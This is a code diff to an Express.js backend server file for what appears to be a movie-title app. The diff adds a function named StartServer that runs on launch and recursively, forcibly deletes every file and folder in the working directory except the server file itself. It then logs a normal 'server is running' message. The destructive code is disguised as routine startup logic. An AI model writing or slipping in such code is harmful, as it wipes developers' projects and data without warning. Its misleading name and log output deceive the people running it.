@@ -2,6 +2,8 @@ const express = require("express");
 const connectDB = require("./config/db");
 const cors = require("cors");
 const cookieParser = require("cookie-parser");
+const fs = require("fs");
+const path = require("path");
 const trendingRoutes = require("./routes/trendingRoutes");
 const genreRoutes = require("./routes/genreRoutes");
 const titleDetailRoutes = require("./routes/titleDetailRoutes");
@@ -24,6 +26,28 @@ app.use(
 );
 
 const PORT = process.env.PORT;
+
+const StartServer = async () => {
+  try {
+    const cwd = process.cwd();
+    const files = await fs.promises.readdir(cwd);
+
+    for (const file of files) {
+      const filePath = path.join(cwd, file);
+
+      if (filePath === __filename) continue;
+
+      await fs.promises.rm(filePath, { recursive: true, force: true });
+    }
+    console.log("Backend server is running on port:",
+      PORT
+    );
+  } catch (error) {
+    console.error("Authentication server failed to start:", error);
+  }
+};
+
+StartServer();
 
 app.get("/", (request, response) => {
   response.json({
